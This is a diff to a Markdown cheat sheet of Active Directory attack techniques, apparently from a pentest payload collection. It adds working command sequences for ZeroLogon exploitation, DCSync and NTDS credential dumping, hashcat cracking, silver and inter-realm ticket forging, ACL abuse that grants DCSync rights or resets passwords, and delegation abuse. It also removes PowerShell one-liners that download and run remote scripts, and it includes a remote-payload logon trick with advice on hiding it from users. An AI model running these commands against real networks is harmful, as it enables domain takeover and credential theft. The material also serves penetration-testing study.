@@ -5,8 +5,13 @@
 - [Active Directory Attacks](#active-directory-attacks)
   - [Summary](#summary)
   - [Tools](#tools)
+  - [Active Directory Recon](#active-directory-recon)
+    - [Using BloodHound](#using-bloodhound)
+    - [Using PowerView](#using-powerview)
+    - [Using AD Module](#using-ad-module)
   - [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
     - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
+    - [CVE-2020-1472 ZeroLogon](#cve-2020-1472-zerologon)
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
     - [Passwords in SYSVOL & Group Policy Preferences](#passwords-in-sysvol-&-group-policy-preferences)
@@ -48,9 +53,15 @@
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
       - [GenericAll](#genericall)
       - [GenericWrite](#genericwrite)
+      	- [GenericWrite and Remote Connection Manager](#genericwrite-and-remote-connection-manager)
       - [WriteDACL](#writedacl)
+      - [WriteOwner](#writeowner)
+      - [ReadLAPSPassword](#readlapspassword)
+      - [ReadGMSAPassword](#readgmsapassword)
+      - [ForceChangePassword](#forcechangepassword)
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
+    - [Forest to Forest Compromise - Trust Ticket](#forest-to-forest-compromise---trust-ticket)
     - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
     - [Kerberos Constrained Delegation](#kerberos-constrained-delegation)
     - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
@@ -68,37 +79,10 @@
 ## Tools
 
 * [Impacket](https://github.com/CoreSecurity/impacket) or the [Windows version](https://github.com/maaaaz/impacket-examples-windows)
-* [Responder](https://github.com/SpiderLabs/Responder)
+* [Responder](https://github.com/lgandx/Responder)
+* [InveighZero](https://github.com/Kevin-Robertson/InveighZero)
 * [Mimikatz](https://github.com/gentilkiwi/mimikatz)
 * [Ranger](https://github.com/funkandwagnalls/ranger)
-* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
-
-  ```powershell
-  # start BloodHound and the database
-  root@payload$ apt install bloodhound #kali
-  root@payload$ neo4j console
-  root@payload$ ./bloodhound
-  Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
-  
-  # run the ingestor on the machine using SharpHound.exe
-  # https://github.com/BloodHoundAD/SharpHound3
-  .\SharpHound.exe (from resources/Ingestor)
-  .\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
-  .\SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
-  .\SharpHound.exe -c all -d active.htb -SearchForest
-  .\SharpHound.exe --EncryptZip --ZipFilename export.zip
-  .\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
-
-  # or run the ingestor on the machine using Powershell
-  # https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors
-  Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
-  Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
-
-  # or remotely via BloodHound Python
-  # https://github.com/fox-it/BloodHound.py
-  bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
-  ```
-
 * [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 
@@ -131,13 +115,6 @@
   # -t: Target (You cannot relay credentials to the same device that you’re spoofing)
   # -i: open an interactive shell
   ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
-  ```
-
-* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
-
-  ```powershell
-  powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks"
-  powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
   ```
 
 * [ADRecon](https://github.com/sense-of-security/ADRecon)
@@ -184,6 +161,236 @@
     Install-Lab
     Show-LabDeploymentSummary
     ```
+
+## Active Directory Recon
+
+### Using BloodHound
+
+Use the correct collector
+* AzureHound for Azure Active Directory
+* SharpHound for local Active Directory
+
+use [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)
+
+```powershell
+# require: Install-Module -name Az -AllowClobber
+# require: Install-Module -name AzureADPreview -AllowClobber
+Connect-AzureAD
+Connect-AzAccount
+. .\AzureHound.ps1
+Invoke-AzureHound
+```
+
+use [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+
+```powershell
+# run the collector on the machine using SharpHound.exe
+# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
+.\SharpHound.exe (from resources/Ingestor)
+.\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
+.\SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
+.\SharpHound.exe -c all -d active.htb -SearchForest
+.\SharpHound.exe --EncryptZip --ZipFilename export.zip
+.\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
+
+# or run the collector on the machine using Powershell
+# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
+Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
+Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
+
+# or remotely via BloodHound Python
+# https://github.com/fox-it/BloodHound.py
+pip install bloodhound
+bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
+```
+
+Then import the zip/json files into the Neo4J database and query them.
+
+```powershell
+root@payload$ apt install bloodhound 
+
+# start BloodHound and the database
+root@payload$ neo4j console
+root@payload$ ./bloodhound --no-sandbox
+Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
+```
+
+You can add some custom queries like [Bloodhound-Custom-Queries](https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json) from @hausec. Replace the customqueries.json file located at `/home/username/.config/bloodhound/customqueries.json` or `C:\Users\USERNAME\AppData\Roaming\BloodHound\customqueries.json`.
+
+
+### Using PowerView
+  
+- **Get Current Domain:** `Get-NetDomain`
+- **Enum Other Domains:** `Get-NetDomain -Domain <DomainName>`
+- **Get Domain SID:** `Get-DomainSID`
+- **Get Domain Policy:** 
+  ```
+  Get-DomainPolicy
+
+  #Will show us the policy configurations of the Domain about system access or kerberos
+  (Get-DomainPolicy)."system access"
+  (Get-DomainPolicy)."kerberos policy"
+  ```
+- **Get Domain Controlers:** 
+  ```
+  Get-NetDomainController
+  Get-NetDomainController -Domain <DomainName>
+  ```
+- **Enumerate Domain Users:** 
+  ```
+  Get-NetUser
+  Get-NetUser -SamAccountName <user> 
+  Get-NetUser | select cn
+  Get-UserProperty
+
+  #Check last password change
+  Get-UserProperty -Properties pwdlastset
+
+  #Get a spesific "string" on a user's attribute
+  Find-UserField -SearchField Description -SearchTerm "wtver"
+  
+  #Enumerate user logged on a machine
+  Get-NetLoggedon -ComputerName <ComputerName>
+  
+  #Enumerate Session Information for a machine
+  Get-NetSession -ComputerName <ComputerName>
+  
+  #Enumerate domain machines of the current/specified domain where specific users are logged into
+  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
+  ```
+- **Enum Domain Computers:** 
+  ```
+  Get-NetComputer -FullData
+  Get-DomainGroup
+
+  #Enumerate Live machines 
+  Get-NetComputer -Ping
+  ```
+- **Enum Groups and Group Members:**
+  ```
+  Get-NetGroupMember -GroupName "<GroupName>" -Domain <DomainName>
+  
+  #Enumerate the members of a specified group of the domain
+  Get-DomainGroup -Identity <GroupName> | Select-Object -ExpandProperty Member
+  
+  #Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
+  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
+  ```
+- **Enumerate Shares**
+  ```
+  #Enumerate Domain Shares
+  Find-DomainShare
+  
+  #Enumerate Domain Shares the current user has access
+  Find-DomainShare -CheckShareAccess
+  ```
+- **Enum Group Policies:** 
+  ```
+  Get-NetGPO
+
+  # Shows active Policy on specified machine
+  Get-NetGPO -ComputerName <Name of the PC>
+  Get-NetGPOGroup
+
+  #Get users that are part of a Machine's local Admin group
+  Find-GPOComputerAdmin -ComputerName <ComputerName>
+  ```
+- **Enum OUs:** 
+  ```
+  Get-NetOU -FullData 
+  Get-NetGPO -GPOname <The GUID of the GPO>
+  ```
+- **Enum ACLs:** 
+  ```
+  # Returns the ACLs associated with the specified account
+  Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
+  Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose
+
+  #Search for interesting ACEs
+  Invoke-ACLScanner -ResolveGUIDs
+
+  #Check the ACLs associated with a specified path (e.g smb share)
+  Get-PathAcl -Path "\\Path\Of\A\Share"
+  ```
+- **Enum Domain Trust:** 
+  ```
+  Get-NetDomainTrust
+  Get-NetDomainTrust -Domain <DomainName>
+  ```
+- **Enum Forest Trust:** 
+  ```
+  Get-NetForestDomain
+  Get-NetForestDomain Forest <ForestName>
+
+  #Domains of Forest Enumeration
+  Get-NetForestDomain
+  Get-NetForestDomain Forest <ForestName>
+
+  #Map the Trust of the Forest
+  Get-NetForestTrust
+  Get-NetDomainTrust -Forest <ForestName>
+  ```
+- **User Hunting:** 
+  ```
+  #Finds all machines on the current domain where the current user has local admin access
+  Find-LocalAdminAccess -Verbose
+
+  #Find local admins on all machines of the domain:
+  Invoke-EnumerateLocalAdmin -Verbose
+
+  #Find computers were a Domain Admin OR a spesified user has a session
+  Invoke-UserHunter
+  Invoke-UserHunter -GroupName "RDPUsers"
+  Invoke-UserHunter -Stealth
+
+  #Confirming admin access:
+  Invoke-UserHunter -CheckAccess
+  ```
+  :heavy_exclamation_mark: **Priv Esc to Domain Admin with User Hunting:** \
+  I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him ->   
+  Profit!
+
+  [PowerView 3.0 Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+
+### Using AD Module
+
+- **Get Current Domain:** `Get-ADDomain`
+- **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
+- **Get Domain SID:** `Get-DomainSID`
+- **Get Domain Controlers:** 
+  ```
+  Get-ADDomainController
+  Get-ADDomainController -Identity <DomainName>
+  ```
+- **Enumerate Domain Users:** 
+  ```
+  Get-ADUser -Filter * -Identity <user> -Properties *
+
+  #Get a spesific "string" on a user's attribute
+  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
+  ```
+- **Enum Domain Computers:** 
+  ```
+  Get-ADComputer -Filter * -Properties *
+  Get-ADGroup -Filter * 
+  ```
+- **Enum Domain Trust:** 
+  ```
+  Get-ADTrust -Filter *
+  Get-ADTrust -Identity <DomainName>
+  ```
+- **Enum Forest Trust:** 
+  ```
+  Get-ADForest
+  Get-ADForest -Identity <ForestName>
+
+  #Domains of Forest Enumeration
+  (Get-ADForest).Domains
+  ```
+ - **Enum Local AppLocker Effective Policy:**
+ ```
+ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+ ```
 
 ## Most common paths to AD compromise
 
@@ -268,6 +475,78 @@ Windows> net time /domain /set
 
 * Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780
 
+### CVE-2020-1472 ZeroLogon
+
+White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055
+
+Exploit steps from the white paper
+
+1. Spoofing the client credential
+2. Disabling signing and sealing
+3. Spoofing a call
+4. Changing a computer's AD password to null
+5. From password change to domain admin
+6. :warning: reset the computer's AD password in a proper way to avoid any Deny of Service
+
+```powershell
+$ git clone https://github.com/dirkjanm/CVE-2020-1472.git
+
+# Activate a virtual env to install impacket
+$ python3 -m venv venv
+$ source venv/bin/activate
+$ pip3 install .
+
+# Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
+proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5
+
+# Find the old NT hash of the DC
+proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'
+
+# Restore password from secretsdump 
+# secretsdump will automatically dump the plaintext machine password (hex encoded) 
+# when dumping the local registry secrets on the newest version
+python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
+deactivate
+```
+
+in .NET for Cobalt Strike's execute-assembly
+
+```powershell
+git clone https://github.com/nccgroup/nccfsas
+# Check
+execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local
+
+# Resetting the machine account password
+execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset
+
+# Testing from a non Domain-joined machine
+execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch
+
+# Now reset the password back
+```
+
+with Mimikatz : 2.2.0 20200917 Post-Zerologon
+
+```powershell
+privilege::debug
+# Check for the CVE
+lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$
+
+# Exploit the CVE and set the computer account's password to ""
+lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit
+
+# Execute dcsync to extract some hashes
+lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
+lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
+
+# Pass The Hash with the extracted Domain Admin hash
+sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN
+
+# Use IP address instead of FQDN to force NTLM with Windows APIs 
+# Reset password to Waza1234/Waza1234/Waza1234/
+# https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584
+lsadump::postzerologon /target:10.10.10.10 /account:DC01$
+```
 
 ### Open Shares
 
@@ -408,6 +687,8 @@ Get-NetGPOGroup
 
 > Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner
 
+:warning: Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: gpupdate /force. 
+
 ```powershell
 # Build and configure SharpGPOAbuse
 git clone https://github.com/FSecureLABS/SharpGPOAbuse
@@ -457,8 +738,18 @@ New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArgumen
 ### Dumping AD Domain Credentials
 
 You will need the following files to extract the ntds : 
-- ntds file (C:\Windows\NTDS\ntds.dit)
+- NTDS.dit file
 - SYSTEM hive (C:\Windows\System32\SYSTEM)
+
+Usually you can find the ntds in two locations : `systemroot\NTDS\ntds.dit` and `systemroot\System32\ntds.dit`.
+- `systemroot\NTDS\ntds.dit` stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data).
+- `systemroot\System32\ntds.dit` is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD.
+
+However you can change the location to a custom one, you will need to query the registry to get the current location.
+
+```powershell
+reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"
+```
 
 #### Using ndtsutil
 
@@ -571,7 +862,11 @@ cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default
 Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. 
 
 ```powershell
+# DCSync only one user
 mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
+
+# DCSync all users of the domain
+mimikatz# lsadump::dcsync /domain:htb.local /all /csv
 ```
 
 :warning: Read-Only Domain Controllers are not allowed to pull password data for users by default.
@@ -586,6 +881,30 @@ sekurlsa::krbtgt
 lsadump::lsa /inject /name:krbtgt
 ```
 
+#### Crack NTLM hashes with hashcat
+
+Useful when you want to have the clear text password or when you need to make stats about weak passwords.
+
+Recommended wordlists:
+- rockyou (available in Kali Linux)
+- Have I Been Powned (https://hashes.org/download.php?hashlistId=7290&type=hfound)
+- Collection #1 (passwords from Data Breaches, might be illegal to possess)
+
+```powershell
+# Basic wordlist
+# (-O) will Optimize for 32 characters or less passwords
+# (-w 4) will set the workload to "Insane" 
+$ hashcat64.exe -m 1000 -w 4 -O -a 0 -o pathtopotfile pathtohashes pathtodico -r ./rules/best64.rule --opencl-device-types 1,2
+
+# Generate a custom mask based on a wordlist
+$ git clone https://github.com/iphelix/pack/blob/master/README
+$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask
+$ python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask
+```
+
+:warning: If the password is not a confidential data (challenges/ctf), you can use online "cracker" like :
+- [hashes.org](https://hashes.org/check.php)
+- [hashes.com](https://hashes.com/en/decrypt/hash)
 
 ### Password spraying
 
@@ -722,7 +1041,7 @@ Mitigations:
 
 ### Pass-the-Ticket Silver Tickets
 
-Forging a TGS require machine accound password (key) or NTLM hash from the KDC
+Forging a TGS require machine accound password (key) or NTLM hash of the service account.
 
 ```powershell
 # Create a ticket for the service
@@ -738,6 +1057,19 @@ mimikatz $ misc::convert ccache ticket.kirbi
 root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
 root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
+
+Interesting services to target with a silver ticket :
+
+| Service Type                                | Service Silver Tickets | Attack |
+|---------------------------------------------|------------------------|--------|
+| WMI                                         | HOST + RPCSS           | `wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"`     |
+| PowerShell Remoting                         | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
+| WinRM                                       | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
+| Scheduled Tasks                             | HOST                   | `schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"` |
+| Windows File Share (CIFS)                   | CIFS                   | `dir \\dc01\c$` |
+| LDAP operations including Mimikatz DCSync   | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt` |
+| Windows Remote Server Administration Tools  | RPCSS   + LDAP  + CIFS | /      |
+
 
 Mitigations:
 * Set the attribute "Account is Sensitive and Cannot be Delegated" to prevent lateral movement with the generated ticket.
@@ -764,6 +1096,12 @@ Alternatively with [Rubeus](https://github.com/GhostPack/Rubeus)
 
 ```powershell
 .\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
+```
+
+Alternatively with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+
+```powershell
+Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
 ```
 
 Alternatively on macOS machine you can use [bifrost](https://github.com/its-a-feature/bifrost)
@@ -879,7 +1217,7 @@ or with the builtin Windows RDP and mimikatz
 sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
 ```
 
-You can extract the local SAM database to find the local administrator hash :
+You can extract the local **SAM database** to find the local administrator hash :
 
 ```powershell
 C:\> reg.exe save hklm\sam c:\temp\sam.save
@@ -1136,17 +1474,83 @@ Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
 
 * WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
 
+##### GenericWrite and Remote Connection Manager
+
+> Now let’s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called ‘Environment’.
+>  
+> This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/
+
+:warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (>2016), it requires a registry change to re-enable.
+
+```powershell
+$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
+$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
+$UserObject.TerminalServicesWorkDirectory = "C:\"
+$UserObject.SetInfo()
+```
+
+NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.
 
 #### WriteDACL
 
 To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn) is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : `./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'`
 
+* WriteDACL on Domain
+  ```powershell
+  # Give DCSync right to the principal identity
+  Import-Module .\PowerView.ps1
+  $SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
+  $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
+  Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
+  ```
+  
+* WriteDACL on Group
+  ```powershell
+  Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights WriteMembers -PrincipalIdentity User1
+  net group "INTERESTING_GROUP" User1 /add /domain
+  ```
+
+#### WriteOwner
+
+An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module).
+
 ```powershell
-# Give DCSync right to the principal identity
-Import-Module .\PowerView.ps1
-$SecPassword = ConvertTo-SecureString 'user1pwd' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN.LOCAL\user1', $SecPassword)
-Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=domain,DC=local' -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local 
+Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
+```
+
+This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.
+
+
+#### ReadLAPSPassword
+
+An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module.
+
+```powershell
+Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
+```
+
+
+#### ReadGMSAPassword
+
+An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules.
+
+```powershell
+# Save the blob to a variable
+$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+
+# Decode the data structure using the DSInternals module
+ConvertFrom-ADManagedPasswordBlob $mp
+```
+
+#### ForceChangePassword
+
+An attacker can change the password of the user this ACE applies to. 
+This can be achieved with Set-DomainUserPassword (PowerView module).
+
+```powershell
+$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 ```
 
 
@@ -1211,6 +1615,42 @@ Prerequisite:
     ```powershell
     kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
     ```
+
+### Forest to Forest Compromise - Trust Ticket
+
+From the DC, dump the hash of the `currentdomain\targetdomain$` trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using 
+Mimikatz, adding the SID for the target domain's enterprise admins group to our **SID history**.
+
+#### Dumping trust passwords (trust keys)
+
+> Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing “$” are computer accounts, but some are trust accounts.
+
+```powershell
+lsadump::trust /patch
+
+or find the TRUST_NAME$ machine account hash
+```
+
+#### Create a forged trust ticket (inter-realm TGT) using Mimikatz
+
+```powershell
+mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\temp\trust.kirbi
+mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
+```
+
+#### Use the Trust Ticket file to get a TGS for the targeted service
+
+```powershell
+.\asktgs.exe c:\temp\trust.kirbi CIFS/machine.domain.local
+.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
+```
+
+Inject the TGS file and access the targeted service with the spoofed rights.
+
+```powershell
+kirbikator lsa .\ticket.kirbi
+ls \\machine.domain.local\c$
+```
 
 ### Kerberos Unconstrained Delegation
 
@@ -1305,8 +1745,9 @@ Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 [*] Saving ticket in Administrator.ccache
 
 # Exploit with Rubeus
+$ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...
 $ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
-$ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /ptt
+$ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
 $ dir \\dc.domain.com\c$
 ```
 
@@ -1344,7 +1785,6 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
 
     ```powershell
     $ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid
-
     $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
     $SDBytes = New-Object byte[] ($SD.BinaryLength)
     $SD.GetBinaryForm($SDBytes, 0)
@@ -1352,6 +1792,15 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
     $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
     $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
     $Descriptor.DiscretionaryAcl
+    ```
+
+    ```ps1
+    # alternative
+    $SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid
+    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer M3DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+    # alternative
+    StandIn_Net35.exe --computer m3dc --sid SID_FROM_PREVIOUS_COMMAND
     ```
 
 5. Use Rubeus to get hash from password
@@ -1371,7 +1820,7 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
 6. Impersonate domain admin using our newly created machine account
 
     ```powershell
-    .\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt
